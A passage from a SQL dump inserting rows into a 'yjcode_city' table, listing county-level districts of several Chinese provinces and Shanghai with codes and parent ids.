(956, '1210406', '新宾满族自治县', 3, '905', 0),
(957, '1210407', '清原满族自治县', 3, '905', 0),
(958, '1210499', '其他区县', 3, '905', 0),
(959, '1210501', '平山区', 3, '915', 0),
(960, '1210502', '溪湖区', 3, '915', 0),
(961, '1210503', '明山区', 3, '915', 0),
(962, '1210504', '南芬区', 3, '915', 0),
(963, '1210505', '本溪满族自治县', 3, '915', 0),
(964, '1210506', '桓仁满族自治县', 3, '915', 0),
(965, '1210599', '其他区县', 3, '915', 0),
(966, '1210601', '振兴区', 3, '908', 0),
(967, '1210602', '元宝区', 3, '908', 0),
(968, '1210603', '振安区', 3, '908', 0),
(969, '1210604', '凤城市', 3, '908', 0),
(970, '1210605', '东港市', 3, '908', 0),
(971, '1210606', '宽甸满族自治县', 3, '908', 0),
(972, '1210699', '其他区县', 3, '908', 0),
(973, '1210701', '太和区', 3, '910', 0),
(974, '1210702', '古塔区', 3, '910', 0),
(975, '1210703', '凌河区', 3, '910', 0),
(976, '1210704', '凌海市', 3, '910', 0),
(977, '1210705', '北镇市', 3, '910', 0),
(978, '1210706', '黑山县', 3, '910', 0),
(979, '1210707', '义县', 3, '910', 0),
(980, '1210799', '其他区县', 3, '910', 0),
(981, '1210801', '站前区', 3, '909', 0),
(982, '1210802', '西市区', 3, '909', 0),
(983, '1210803', '鲅鱼圈区', 3, '909', 0),
(984, '1210804', '老边区', 3, '909', 0),
(985, '913', '大石桥市', 3, '909', 0),
(986, '1210806', '盖州市', 3, '909', 0),
(987, '917', '熊岳市', 3, '909', 0),
(988, '1210899', '其他区县', 3, '909', 0),
(989, '1210901', '白塔区', 3, '911', 0),
(990, '1210902', '文圣区', 3, '911', 0),
(991, '1210903', '宏伟区', 3, '911', 0),
(992, '1210904', '弓长岭区', 3, '911', 0),
(993, '1210905', '太子河区', 3, '911', 0),
(994, '1210906', '灯塔市', 3, '911', 0),
(995, '1210907', '辽阳县', 3, '911', 0),
(996, '1210999', '其他区县', 3, '911', 0),
(997, '1211001', '兴隆台区', 3, '914', 0),
(998, '1211002', '双台子区', 3, '914', 0),
(999, '1211003', '大洼县', 3, '914', 0),
(1000, '1211004', '盘山县', 3, '914', 0),
(1001, '1211099', '其他区县', 3, '914', 0),
(1002, '1211101', '银州区', 3, '904', 0),
(1003, '1211102', '清河区', 3, '904', 0),
(1004, '1211103', '调兵山市', 3, '904', 0),
(1005, '1211104', '开原市', 3, '904', 0),
(1006, '1211105', '铁岭县', 3, '904', 0),
(1007, '1211106', '西丰县', 3, '904', 0),
(1008, '1211107', '昌图县', 3, '904', 0),
(1009, '1211199', '其他区县', 3, '904', 0),
(1010, '1211201', '双塔区', 3, '902', 0),
(1011, '1211202', '龙城区', 3, '902', 0),
(1012, '1211203', '北票市', 3, '902', 0),
(1013, '1211204', '凌源市', 3, '902', 0),
(1014, '1211205', '朝阳县', 3, '902', 0),
(1015, '1211206', '建平县', 3, '902', 0),
(1016, '1211207', '喀喇沁左翼蒙古族自治县', 3, '902', 0),
(1017, '1211299', '其他区县', 3, '902', 0),
(1018, '1211301', '龙港区', 3, '912', 0),
(1019, '1211302', '连山区', 3, '912', 0),
(1020, '1211303', '南票区', 3, '912', 0),
(1021, '1211304', '兴城市', 3, '912', 0),
(1022, '1211305', '绥中县', 3, '912', 0),
(1023, '1211306', '建昌县', 3, '912', 0),
(1024, '1211399', '其他区县', 3, '912', 0),
(1025, '1211401', '海州区', 3, '903', 0),
(1026, '1211402', '新邱区', 3, '903', 0),
(1027, '1211403', '太平区', 3, '903', 0),
(1028, '1211404', '清河门区', 3, '903', 0),
(1029, '1211405', '细河区', 3, '903', 0),
(1030, '1211406', '彰武县', 3, '903', 0),
(1031, '1211407', '阜新蒙古族自治县', 3, '903', 0),
(1032, '1211499', '其他区县', 3, '903', 0),
(1033, '1220111', '高新区', 3, '801', 0),
(1034, '1220113', '经开区', 3, '801', 0),
(1035, '1220112', '净月区', 3, '801', 0),
(1036, '1220114', '一汽厂区', 3, '801', 0),
(1037, '1220101', '朝阳区', 3, '801', 0),
(1038, '1220102', '南关区', 3, '801', 0),
(1039, '1220103', '宽城区', 3, '801', 0),
(1040, '1220104', '二道区', 3, '801', 0),
(1041, '1220105', '绿园区', 3, '801', 0),
(1042, '1220106', '双阳区', 3, '801', 0),
(1043, '1220107', '德惠市', 3, '801', 0),
(1044, '1220108', '九台市', 3, '801', 0),
(1045, '1220109', '榆树市', 3, '801', 0),
(1046, '1220110', '农安县', 3, '801', 0),
(1047, '1220199', '其他区县', 3, '801', 0),
(1048, '1220201', '船营区', 3, '804', 0),
(1049, '1220202', '龙潭区', 3, '804', 0),
(1050, '1220203', '昌邑区', 3, '804', 0),
(1051, '1220204', '丰满区', 3, '804', 0),
(1052, '1220205', '磐石市', 3, '804', 0),
(1053, '1220206', '蛟河市', 3, '804', 0),
(1054, '1220207', '桦甸市', 3, '804', 0),
(1055, '1220208', '舒兰市', 3, '804', 0),
(1056, '1220209', '永吉县', 3, '804', 0),
(1057, '1220299', '其他区县', 3, '804', 0),
(1058, '1220301', '铁西区', 3, '805', 0),
(1059, '1220302', '铁东区', 3, '805', 0),
(1060, '1220303', '双辽市', 3, '805', 0),
(1061, '1220304', '公主岭市', 3, '805', 0),
(1062, '1220305', '梨树县', 3, '805', 0),
(1063, '1220306', '伊通满族自治县', 3, '805', 0),
(1064, '1220399', '其他区县', 3, '805', 0),
(1065, '1220401', '龙山区', 3, '12204', 0),
(1066, '1220402', '西安区', 3, '12204', 0),
(1067, '1220403', '东丰县', 3, '12204', 0),
(1068, '1220404', '东辽县', 3, '12204', 0),
(1069, '1220499', '其他区县', 3, '12204', 0),
(1070, '1220501', '东昌区', 3, '807', 0),
(1071, '1220502', '二道江区', 3, '807', 0),
(1072, '1220503', '梅河口市', 3, '807', 0),
(1073, '1220504', '集安市', 3, '807', 0),
(1074, '1220505', '通化县', 3, '807', 0),
(1075, '1220506', '辉南县', 3, '807', 0),
(1076, '1220507', '柳河县', 3, '807', 0),
(1077, '1220599', '其他区县', 3, '807', 0),
(1078, '1220601', '八道江区', 3, '12206', 0),
(1079, '1220602', '江源区', 3, '12206', 0),
(1080, '1220603', '临江市', 3, '12206', 0),
(1081, '1220604', '抚松县', 3, '12206', 0),
(1082, '1220605', '靖宇县', 3, '12206', 0),
(1083, '1220606', '长白朝鲜族自治县', 3, '12206', 0),
(1084, '1220699', '其他区县', 3, '12206', 0),
(1085, '1220701', '宁江区', 3, '803', 0),
(1086, '1220702', '扶余县', 3, '803', 0),
(1087, '1220703', '长岭县', 3, '803', 0),
(1088, '1220704', '乾安县', 3, '803', 0),
(1089, '1220705', '前郭尔罗斯蒙古族自治县', 3, '803', 0),
(1090, '1220799', '其他区县', 3, '803', 0),
(1091, '1220801', '洮北区', 3, '802', 0),
(1092, '1220802', '洮南市', 3, '802', 0),
(1093, '1220803', '大安市', 3, '802', 0),
(1094, '1220804', '镇赉县', 3, '802', 0),
(1095, '1220805', '通榆县', 3, '802', 0),
(1096, '1220899', '其他区县', 3, '802', 0),
(1097, '806', '延吉市', 3, '12209', 0),
(1098, '1220902', '图们市', 3, '12209', 0),
(1099, '1220903', '敦化市', 3, '12209', 0),
(1100, '808', '珲春市', 3, '12209', 0),
(1101, '1220905', '龙井市', 3, '12209', 0),
(1102, '1220906', '和龙市', 3, '12209', 0),
(1103, '1220907', '汪清县', 3, '12209', 0),
(1104, '1220908', '安图县', 3, '12209', 0),
(1105, '1220999', '其他区县', 3, '12209', 0),
(1106, '1230119', '动力区', 3, '701', 0),
(1107, '1230101', '松北区', 3, '701', 0),
(1108, '1230102', '道里区', 3, '701', 0),
(1109, '1230103', '南岗区', 3, '701', 0),
(1110, '1230104', '道外区', 3, '701', 0),
(1111, '1230105', '香坊区', 3, '701', 0),
(1112, '1230106', '平房区', 3, '701', 0),
(1113, '1230107', '呼兰区', 3, '701', 0),
(1114, '1230108', '阿城区', 3, '701', 0),
(1115, '1230109', '双城市', 3, '701', 0),
(1116, '1230110', '尚志市', 3, '701', 0),
(1117, '1230111', '五常市', 3, '701', 0),
(1118, '1230112', '依兰县', 3, '701', 0),
(1119, '1230113', '方正县', 3, '701', 0),
(1120, '1230114', '宾县', 3, '701', 0),
(1121, '1230115', '巴彦县', 3, '701', 0),
(1122, '1230116', '木兰县', 3, '701', 0),
(1123, '1230117', '通河县', 3, '701', 0),
(1124, '1230118', '延寿县', 3, '701', 0),
(1125, '1230199', '其他区县', 3, '701', 0),
(1126, '1230201', '建华区', 3, '702', 0),
(1127, '1230202', '龙沙区', 3, '702', 0),
(1128, '1230203', '铁锋区', 3, '702', 0),
(1129, '1230204', '昂昂溪区', 3, '702', 0),
(1130, '1230205', '富拉尔基区', 3, '702', 0),
(1131, '1230206', '碾子山区', 3, '702', 0),
(1132, '1230207', '梅里斯达斡尔族区', 3, '702', 0),
(1133, '1230208', '讷河市', 3, '702', 0),
(1134, '1230209', '龙江县', 3, '702', 0),
(1135, '1230210', '依安县', 3, '702', 0),
(1136, '1230211', '泰来县', 3, '702', 0),
(1137, '1230212', '甘南县', 3, '702', 0),
(1138, '1230213', '富裕县', 3, '702', 0),
(1139, '1230214', '克山县', 3, '702', 0),
(1140, '1230215', '克东县', 3, '702', 0),
(1141, '1230216', '拜泉县', 3, '702', 0),
(1142, '1230299', '其他区县', 3, '702', 0),
(1143, '1230301', '鸡冠区', 3, '708', 0),
(1144, '1230302', '恒山区', 3, '708', 0),
(1145, '1230303', '滴道区', 3, '708', 0),
(1146, '1230304', '梨树区', 3, '708', 0),
(1147, '1230305', '城子河区', 3, '708', 0),
(1148, '1230306', '麻山区', 3, '708', 0),
(1149, '1230307', '虎林市', 3, '708', 0),
(1150, '1230308', '密山市', 3, '708', 0),
(1151, '1230309', '鸡东县', 3, '708', 0),
(1152, '1230399', '其他区县', 3, '708', 0),
(1153, '1230401', '兴山区', 3, '709', 0),
(1154, '1230402', '向阳区', 3, '709', 0),
(1155, '1230403', '工农区', 3, '709', 0),
(1156, '1230404', '南山区', 3, '709', 0),
(1157, '1230405', '兴安区', 3, '709', 0),
(1158, '1230406', '东山区', 3, '709', 0),
(1159, '1230407', '萝北县', 3, '709', 0),
(1160, '1230408', '绥滨县', 3, '709', 0),
(1161, '1230499', '其他区县', 3, '709', 0),
(1162, '1230501', '尖山区', 3, '12305', 0),
(1163, '1230502', '岭东区', 3, '12305', 0),
(1164, '1230503', '四方台区', 3, '12305', 0),
(1165, '1230504', '宝山区', 3, '12305', 0),
(1166, '1230505', '集贤县', 3, '12305', 0),
(1167, '1230506', '友谊县', 3, '12305', 0),
(1168, '1230507', '宝清县', 3, '12305', 0),
(1169, '1230508', '饶河县', 3, '12305', 0),
(1170, '1230599', '其他区县', 3, '12305', 0),
(1171, '1230610', '开发区', 3, '704', 0),
(1172, '1230601', '萨尔图区', 3, '704', 0),
(1173, '1230602', '龙凤区', 3, '704', 0),
(1174, '1230603', '让胡路区', 3, '704', 0),
(1175, '1230604', '大同区', 3, '704', 0),
(1176, '1230605', '红岗区', 3, '704', 0),
(1177, '1230606', '肇州县', 3, '704', 0),
(1178, '1230607', '肇源县', 3, '704', 0),
(1179, '1230608', '林甸县', 3, '704', 0),
(1180, '1230609', '杜尔伯特蒙古族自治县', 3, '704', 0),
(1181, '1230699', '其他区县', 3, '704', 0),
(1182, '1230701', '伊春区', 3, '705', 0),
(1183, '1230702', '南岔区', 3, '705', 0),
(1184, '1230703', '友好区', 3, '705', 0);
INSERT INTO `yjcode_city` (`id`, `bh`, `name1`, `level`, `parentid`, `xh`) VALUES
(1185, '1230704', '西林区', 3, '705', 0),
(1186, '1230705', '翠峦区', 3, '705', 0),
(1187, '1230706', '新青区', 3, '705', 0),
(1188, '1230707', '美溪区', 3, '705', 0),
(1189, '1230708', '金山屯区', 3, '705', 0),
(1190, '1230709', '五营区', 3, '705', 0),
(1191, '1230710', '乌马河区', 3, '705', 0),
(1192, '1230711', '汤旺河区', 3, '705', 0),
(1193, '1230712', '带岭区', 3, '705', 0),
(1194, '1230713', '乌伊岭区', 3, '705', 0),
(1195, '1230714', '红星区', 3, '705', 0),
(1196, '1230715', '上甘岭区', 3, '705', 0),
(1197, '1230716', '铁力市', 3, '705', 0),
(1198, '1230717', '嘉荫县', 3, '705', 0),
(1199, '1230799', '其他区县', 3, '705', 0),
(1200, '1230811', '永红区', 3, '706', 0),
(1201, '1230801', '前进区', 3, '706', 0),
(1202, '1230802', '向阳区', 3, '706', 0),
(1203, '1230803', '东风区', 3, '706', 0),
(1204, '1230804', '郊区', 3, '706', 0),
(1205, '1230805', '同江市', 3, '706', 0),
(1206, '1230806', '富锦市', 3, '706', 0),
(1207, '1230807', '桦南县', 3, '706', 0),
(1208, '1230808', '桦川县', 3, '706', 0),
(1209, '1230809', '汤原县', 3, '706', 0),
(1210, '1230810', '抚远县', 3, '706', 0),
(1211, '1230899', '其他区县', 3, '706', 0),
(1212, '1230901', '桃山区', 3, '12309', 0),
(1213, '1230902', '新兴区', 3, '12309', 0),
(1214, '1230903', '茄子河区', 3, '12309', 0),
(1215, '1230904', '勃利县', 3, '12309', 0),
(1216, '1230999', '其他区县', 3, '12309', 0),
(1217, '1231001', '爱民区', 3, '707', 0),
(1218, '1231002', '东安区', 3, '707', 0),
(1219, '1231003', '阳明区', 3, '707', 0),
(1220, '1231004', '西安区', 3, '707', 0),
(1221, '1231005', '穆棱市', 3, '707', 0),
(1222, '1231006', '绥芬河市', 3, '707', 0),
(1223, '1231007', '海林市', 3, '707', 0),
(1224, '1231008', '宁安市', 3, '707', 0),
(1225, '1231009', '东宁县', 3, '707', 0),
(1226, '1231010', '林口县', 3, '707', 0),
(1227, '1231099', '其他区县', 3, '707', 0),
(1228, '1231101', '爱辉区', 3, '703', 0),
(1229, '1231102', '北安市', 3, '703', 0),
(1230, '1231103', '五大连池市', 3, '703', 0),
(1231, '1231104', '嫩江县', 3, '703', 0),
(1232, '1231105', '逊克县', 3, '703', 0),
(1233, '1231106', '孙吴县', 3, '703', 0),
(1234, '1231199', '其他区县', 3, '703', 0),
(1235, '1231201', '北林区', 3, '12312', 0),
(1236, '1231202', '安达市', 3, '12312', 0),
(1237, '1231203', '肇东市', 3, '12312', 0),
(1238, '1231204', '海伦市', 3, '12312', 0),
(1239, '1231205', '望奎县', 3, '12312', 0),
(1240, '1231206', '兰西县', 3, '12312', 0),
(1241, '1231207', '青冈县', 3, '12312', 0),
(1242, '1231208', '庆安县', 3, '12312', 0),
(1243, '1231209', '明水县', 3, '12312', 0),
(1244, '1231210', '绥棱县', 3, '12312', 0),
(1245, '1231299', '其他区县', 3, '12312', 0),
(1246, '1231301', '呼玛县', 3, '12313', 0),
(1247, '1231302', '塔河县', 3, '12313', 0),
(1248, '1231303', '漠河县', 3, '12313', 0),
(1249, '1231399', '其他区县', 3, '12313', 0),
(1250, '1310101', '黄浦区', 3, '3', 0),
(1251, '1310102', '卢湾区', 3, '3', 0),
(1252, '1310103', '徐汇区', 3, '3', 0),
(1253, '1310104', '长宁区', 3, '3', 0),
(1254, '1310105', '静安区', 3, '3', 0),
(1255, '1310106', '普陀区', 3, '3', 0),
(1256, '1310107', '闸北区', 3, '3', 0),
(1257, '1310108', '虹口区', 3, '3', 0),
(1258, '1310109', '杨浦区', 3, '3', 0),
(1259, '1310110', '闵行区(浦江镇)', 3, '3', 0),
(1260, '1310111', '宝山区', 3, '3', 0),
(1261, '1310112', '嘉定区', 3, '3', 0),
(1262, '1310113', '浦东新区', 3, '3', 0),
(1263, '1310114', '金山区', 3, '3', 0),
(1264, '1310115', '松江区', 3, '3', 0),
(1265, '1310116', '青浦区', 3, '3', 0),
(1266, '1310117', '南汇区', 3, '3', 0),
(1267, '1310118', '奉贤区', 3, '3', 0),
(1268, '1310119', '崇明县', 3, '3', 0),
(1269, '1310200', '闵行区（浦江镇以外）', 3, '3', 0),
(1270, '1320114', '高新开发区', 3, '1601', 0),
(1271, '1320101', '玄武区', 3, '1601', 0),
(1272, '1320102', '白下区', 3, '1601', 0),
(1273, '1320103', '秦淮区', 3, '1601', 0),
(1274, '1320104', '建邺区', 3, '1601', 0),
(1275, '1320105', '鼓楼区', 3, '1601', 0),
(1276, '1320106', '下关区', 3, '1601', 0),
(1277, '1320107', '浦口区', 3, '1601', 0),
(1278, '1320108', '六合区', 3, '1601', 0),
(1279, '1320109', '栖霞区', 3, '1601', 0),
(1280, '1320110', '雨花台区', 3, '1601', 0),
(1281, '1320111', '江宁区', 3, '1601', 0),
(1282, '1320112', '溧水县', 3, '1601', 0),
(1283, '1320113', '高淳县', 3, '1601', 0),
(1284, '1320199', '其他区县', 3, '1601', 0),
(1285, '1320201', '崇安区', 3, '1607', 0),
(1286, '1320202', '南长区', 3, '1607', 0),
(1287, '1320203', '北塘区', 3, '1607', 0),
(1288, '1320204', '滨湖区', 3, '1607', 0),
(1289, '1320205', '惠山区', 3, '1607', 0),
(1290, '1320206', '锡山区', 3, '1607', 0),
(1291, '1611', '江阴市', 3, '1607', 0),
(1292, '1320208', '宜兴市', 3, '1607', 0),
(1293, '1320299', '其他区县', 3, '1607', 0),
(1294, '1320209', '新区', 3, '1607', 0),
(1295, '1320301', '云龙区', 3, '1603', 0),
(1296, '1320302', '鼓楼区', 3, '1603', 0),
(1297, '1320303', '九里区', 3, '1603', 0),
(1298, '1320304', '贾汪区', 3, '1603', 0),
(1299, '1320305', '泉山区', 3, '1603', 0),
(1300, '1625', '邳州市', 3, '1603', 0),
(1301, '1320307', '新沂市', 3, '1603', 0),
(1302, '1320308', '铜山县', 3, '1603', 0),
(1303, '1320309', '睢宁县', 3, '1603', 0),
(1304, '1320310', '沛县', 3, '1603', 0),
(1305, '1320311', '丰县', 3, '1603', 0),
(1306, '1320399', '其他区县', 3, '1603', 0),
(1307, '1320401', '钟楼区', 3, '1608', 0),
(1308, '1320402', '天宁区', 3, '1608', 0),
(1309, '1320403', '戚墅堰区', 3, '1608', 0),
(1310, '1320404', '新北区', 3, '1608', 0),
(1311, '1320405', '武进区', 3, '1608', 0),
(1312, '1320406', '金坛市', 3, '1608', 0),
(1313, '1320407', '溧阳市', 3, '1608', 0),
(1314, '1320499', '其他区县', 3, '1608', 0),
(1315, '1320511', '高新区', 3, '1602', 0),
(1316, '1320512', '工业园区', 3, '1602', 0),
(1317, '1320501', '金阊区', 3, '1602', 0),
(1318, '1320502', '沧浪区', 3, '1602', 0),
(1319, '1320503', '平江区', 3, '1602', 0),
(1320, '1320504', '虎丘区', 3, '1602', 0),
(1321, '1320505', '吴中区', 3, '1602', 0),
(1322, '1320506', '相城区', 3, '1602', 0),
(1323, '1320507', '吴江市', 3, '1602', 0),
(1324, '1619', '昆山市', 3, '1602', 0),
(1325, '1320509', '太仓市', 3, '1602', 0),
(1326, '1320510', '常熟市', 3, '1602', 0),
(1327, '1621', '张家港市', 3, '1602', 0),
(1328, '1320599', '其他区县', 3, '1602', 0),
(1329, '1320609', '经济开发区', 3, '1620', 0),
(1330, '1320601', '崇川区', 3, '1620', 0),
(1331, '1320602', '港闸区', 3, '1620', 0),
(1332, '1320603', '海门市', 3, '1620', 0),
(1333, '1320604', '启东市', 3, '1620', 0),
(1334, '1320605', '通州市', 3, '1620', 0),
(1335, '1320606', '如皋市', 3, '1620', 0),
(1336, '1320607', '如东县', 3, '1620', 0),
(1337, '1320608', '海安县', 3, '1620', 0),
(1338, '1320699', '其他区县', 3, '1620', 0),
(1339, '1320701', '新浦区', 3, '1604', 0),
(1340, '1320702', '连云区', 3, '1604', 0),
(1341, '1320703', '海州区', 3, '1604', 0),
(1342, '1320704', '赣榆县', 3, '1604', 0),
(1343, '1320705', '灌云县', 3, '1604', 0),
(1344, '1320706', '东海县', 3, '1604', 0),
(1345, '1320707', '灌南县', 3, '1604', 0),
(1346, '1320799', '其他区县', 3, '1604', 0),
(1347, '1320801', '清河区', 3, '1606', 0),
(1348, '1320802', '清浦区', 3, '1606', 0),
(1349, '1320803', '楚州区', 3, '1606', 0),
(1350, '1624', '淮阴区', 3, '1606', 0),
(1351, '1320805', '金湖县', 3, '1606', 0),
(1352, '1320806', '盱眙县', 3, '1606', 0),
(1353, '1320807', '洪泽县', 3, '1606', 0),
(1354, '1320808', '涟水县', 3, '1606', 0),
(1355, '1320899', '其他区县', 3, '1606', 0),
(1356, '1320809', '经济开发区', 3, '1606', 0),
(1357, '1320901', '亭湖区', 3, '13209', 0),
(1358, '1320902', '盐都区', 3, '13209', 0),
(1359, '1320903', '东台市', 3, '13209', 0),
(1360, '1320904', '大丰市', 3, '13209', 0),
(1361, '1320905', '射阳县', 3, '13209', 0),
(1362, '1320906', '阜宁县', 3, '13209', 0),
(1363, '1320907', '滨海县', 3, '13209', 0),
(1364, '1320908', '响水县', 3, '13209', 0),
(1365, '1320909', '建湖县', 3, '13209', 0),
(1366, '1320999', '其他区县', 3, '13209', 0),
(1367, '1321008', '开发区', 3, '1610', 0),
(1368, '1321001', '维扬区', 3, '1610', 0),
(1369, '1321002', '广陵区', 3, '1610', 0),
(1370, '1321003', '邗江区', 3, '1610', 0),
(1371, '1321004', '仪征市', 3, '1610', 0),
(1372, '1622', '江都市', 3, '1610', 0),
(1373, '1321006', '高邮市', 3, '1610', 0),
(1374, '1321007', '宝应县', 3, '1610', 0),
(1375, '1321099', '其他区县', 3, '1610', 0),
(1376, '1321101', '京口区', 3, '1609', 0),
(1377, '1321102', '润州区', 3, '1609', 0),
(1378, '1618', '丹徒区', 3, '1609', 0),
(1379, '1321104', '扬中市', 3, '1609', 0),
(1380, '1617', '丹阳市', 3, '1609', 0),
(1381, '1321106', '句容市', 3, '1609', 0),
(1382, '1321199', '其他区县', 3, '1609', 0),
(1383, '1321201', '海陵区', 3, '1612', 0),
(1384, '1321202', '高港区', 3, '1612', 0),
(1385, '1615', '靖江市', 3, '1612', 0),
(1386, '1614', '泰兴市', 3, '1612', 0),
(1387, '1616', '姜堰市', 3, '1612', 0),
(1388, '1613', '兴化市', 3, '1612', 0),
(1389, '1321299', '其他区县', 3, '1612', 0),
(1390, '1321301', '宿城区', 3, '1605', 0),
(1391, '1321302', '宿豫区', 3, '1605', 0),
(1392, '1623', '沭阳县', 3, '1605', 0),
(1393, '1321304', '泗阳县', 3, '1605', 0),
(1394, '1321305', '泗洪县', 3, '1605', 0),
(1395, '1321399', '其他区县', 3, '1605', 0),
(1396, '1330109', '下沙经济开发区', 3, '1901', 0),
(1397, '1330101', '上城区', 3, '1901', 0),
(1398, '1330102', '下城区', 3, '1901', 0),
(1399, '1330103', '江干区', 3, '1901', 0),
(1400, '1330104', '拱墅区', 3, '1901', 0),
(1401, '1330105', '西湖区', 3, '1901', 0),
(1402, '1933', '滨江区', 3, '1901', 0),
(1403, '1330107', '萧山区', 3, '1901', 0),
(1404, '1330108', '余杭区', 3, '1901', 0),
(1405, '1911', '建德市', 3, '1901', 0),
(1406, '1948', '富阳市', 3, '1901', 0),
(1407, '1949', '临安市', 3, '1901', 0),
(1408, '1950', '桐庐县', 3, '1901', 0),
(1409, '1951', '淳安县', 3, '1901', 0),
(1410, '1330199', '其他区县', 3, '1901', 0),
(1411, '1330210', '科技园区', 3, '1905', 0),
(1412, '1330201', '海曙区', 3, '1905', 0),
(1413, '1330202', '江东区', 3, '1905', 0),
(1414, '1330203', '江北区', 3, '1905', 0),
(1415, '1330204', '北仑区', 3, '1905', 0),
(1416, '1330205', '镇海区', 3, '1905', 0),
(1417, '1330206', '鄞州区', 3, '1905', 0),
(1418, '1920', '余姚市', 3, '1905', 0),
(1419, '1921', '慈溪市', 3, '1905', 0),
(1420, '1330209', '奉化市', 3, '1905', 0),
(1421, '1922', '象山县', 3, '1905', 0),
(1422, '1934', '宁海县', 3, '1905', 0),
(1423, '1330299', '其他区县', 3, '1905', 0),
(1424, '1330301', '鹿城区', 3, '1906', 0),
(1425, '1330302', '龙湾区', 3, '1906', 0),
(1426, '1330303', '瓯海区', 3, '1906', 0),
(1427, '1907', '瑞安市', 3, '1906', 0),
(1428, '1913', '乐清市', 3, '1906', 0),
(1429, '1330306', '洞头县', 3, '1906', 0),
(1430, '1935', '永嘉县', 3, '1906', 0),
(1431, '1330308', '平阳县', 3, '1906', 0),
(1432, '1330309', '苍南县', 3, '1906', 0),
(1433, '1330310', '文成县', 3, '1906', 0),
(1434, '1330311', '泰顺县', 3, '1906', 0),
(1435, '1330399', '其他区县', 3, '1906', 0),
(1436, '1330401', '南湖区', 3, '1903', 0),
(1437, '1330402', '秀城区', 3, '1903', 0),
(1438, '1936', '平湖市', 3, '1903', 0),
(1439, '1932', '海宁市', 3, '1903', 0),
(1440, '1931', '桐乡市', 3, '1903', 0),
(1441, '1930', '嘉善县', 3, '1903', 0),
(1442, '1937', '海盐县', 3, '1903', 0),
(1443, '1330499', '其他区县', 3, '1903', 0),
(1444, '1330501', '吴兴区', 3, '1902', 0),
(1445, '1330502', '南浔区', 3, '1902', 0),
(1446, '1945', '长兴县', 3, '1902', 0),
(1447, '1944', '德清县', 3, '1902', 0),
(1448, '1946', '安吉县', 3, '1902', 0),
(1449, '1330599', '其他区县', 3, '1902', 0),
(1450, '1330601', '越城区', 3, '1914', 0),
(1451, '1927', '诸暨市', 3, '1914', 0),
(1452, '1916', '上虞市', 3, '1914', 0),
(1453, '1917', '嵊州市', 3, '1914', 0),
(1454, '1330605', '绍兴县', 3, '1914', 0),
(1455, '1926', '新昌县', 3, '1914', 0),
(1456, '1330699', '其他区县', 3, '1914', 0),
(1457, '1330701', '婺城区', 3, '1910', 0),
(1458, '1330702', '金东区', 3, '1910', 0),
(1459, '1918', '兰溪市', 3, '1910', 0),
(1460, '1909', '永康市', 3, '1910', 0),
(1461, '1928', '义乌市', 3, '1910', 0),
(1462, '1929', '东阳市', 3, '1910', 0),
(1463, '1330707', '武义县', 3, '1910', 0),
(1464, '1938', '浦江县', 3, '1910', 0),
(1465, '1330709', '磐安县', 3, '1910', 0),
(1466, '1330799', '其他区县', 3, '1910', 0),
(1467, '1330801', '柯城区', 3, '1908', 0),
(1468, '1330802', '衢江区', 3, '1908', 0),
(1469, '1915', '江山市', 3, '1908', 0),
(1470, '1330804', '常山县', 3, '1908', 0),
(1471, '1330805', '开化县', 3, '1908', 0),
(1472, '1330806', '龙游县', 3, '1908', 0),
(1473, '1330899', '其他区县', 3, '1908', 0),
(1474, '1330901', '定海区', 3, '1904', 0),
(1475, '1330902', '普陀区', 3, '1904', 0),
(1476, '1330903', '岱山县', 3, '1904', 0),
(1477, '1330904', '嵊泗县', 3, '1904', 0),
(1478, '1330999', '其他区县', 3, '1904', 0),
(1479, '1924', '椒江区', 3, '1939', 0),
(1480, '1923', '黄岩区', 3, '1939', 0),
(1481, '1925', '路桥区', 3, '1939', 0),
(1482, '1940', '临海市', 3, '1939', 0),
(1483, '1912', '温岭市', 3, '1939', 0),
(1484, '1331006', '三门县', 3, '1939', 0),
(1485, '1941', '天台县', 3, '1939', 0),
(1486, '1942', '仙居县', 3, '1939', 0),
(1487, '1331009', '玉环县', 3, '1939', 0),
(1488, '1331099', '其他区县', 3, '1939', 0),
(1489, '1331101', '莲都区', 3, '1943', 0),
(1490, '1331102', '龙泉市', 3, '1943', 0),
(1491, '1331103', '缙云县', 3, '1943', 0),
(1492, '1331104', '青田县', 3, '1943', 0),
(1493, '1331105', '云和县', 3, '1943', 0),
(1494, '1331106', '遂昌县', 3, '1943', 0),
(1495, '1331107', '松阳县', 3, '1943', 0),
(1496, '1331108', '庆元县', 3, '1943', 0),
(1497, '1331109', '景宁畲族自治县', 3, '1943', 0),
(1498, '1331199', '其他区县', 3, '1943', 0),
(1499, '1340101', '庐阳区', 3, '1501', 0),
(1500, '1340102', '瑶海区', 3, '1501', 0),
(1501, '1340103', '蜀山区', 3, '1501', 0),
(1502, '1340104', '包河区', 3, '1501', 0),
(1503, '1340105', '长丰县', 3, '1501', 0),
(1504, '1340106', '肥东县', 3, '1501', 0),
(1505, '1340107', '肥西县', 3, '1501', 0),
(1506, '1340199', '其他区县', 3, '1501', 0),
(1507, '1340201', '镜湖区', 3, '1508', 0),
(1508, '1340202', '弋江区', 3, '1508', 0),
(1509, '1340203', '三山区', 3, '1508', 0),
(1510, '1340204', '鸠江区', 3, '1508', 0),
(1511, '1340205', '芜湖县', 3, '1508', 0),
(1512, '1340206', '繁昌县', 3, '1508', 0),
(1513, '1340207', '南陵县', 3, '1508', 0),
(1514, '1340299', '其他区县', 3, '1508', 0),
(1515, '1340208', '高新区', 3, '1508', 0),
(1516, '1340209', '经济开发区', 3, '1508', 0),
(1517, '1340308', '高新技术开发区', 3, '1506', 0),
(1518, '1340309', '经济开发区', 3, '1506', 0),
(1519, '1340301', '蚌山区', 3, '1506', 0),
(1520, '1340302', '龙子湖区', 3, '1506', 0),
(1521, '1340303', '禹会区', 3, '1506', 0),
(1522, '1340304', '淮上区', 3, '1506', 0),
(1523, '1340305', '怀远县', 3, '1506', 0),
(1524, '1340306', '五河县', 3, '1506', 0),
(1525, '1340307', '固镇县', 3, '1506', 0),
(1526, '1340399', '其他区县', 3, '1506', 0),
(1527, '1340407', '开发区', 3, '1503', 0),
(1528, '1340401', '田家庵区', 3, '1503', 0),
(1529, '1340402', '大通区', 3, '1503', 0),
(1530, '1340403', '谢家集区', 3, '1503', 0),
(1531, '1340404', '八公山区', 3, '1503', 0),
(1532, '1340405', '潘集区', 3, '1503', 0),
(1533, '1340406', '凤台县', 3, '1503', 0),
(1534, '1340499', '其他区县', 3, '1503', 0),
(1535, '1340505', '经济技术开发区', 3, '1510', 0),
(1536, '1340501', '雨山区', 3, '1510', 0),
(1537, '1340502', '花山区', 3, '1510', 0),
(1538, '1340503', '金家庄区', 3, '1510', 0),
(1539, '1340504', '当涂县', 3, '1510', 0),
